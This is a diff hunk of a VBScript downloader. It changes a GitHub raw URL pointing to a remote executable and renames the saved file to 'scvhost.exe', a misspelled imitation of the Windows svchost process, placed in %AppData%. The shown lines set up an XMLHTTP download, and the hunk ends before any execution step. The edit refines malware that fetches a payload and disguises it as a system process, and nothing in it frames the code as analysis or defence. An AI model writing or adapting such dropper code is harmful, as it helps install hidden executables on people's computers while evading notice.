@@ -1,6 +1,6 @@
 ' Define parameters
-url = "https://raw.githubusercontent.com/BinaryDev-0100101/hi/refs/heads/main/ben.exe"
-outputFileName = "2.exe"
+url = "https://raw.githubusercontent.com/BinaryDev-0100101/hi/refs/heads/main/abc.exe"
+outputFileName = "scvhost.exe"
 outputFilePath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%AppData%") & "\" & outputFileName
 
 ' Create an XMLHTTP object to download the file
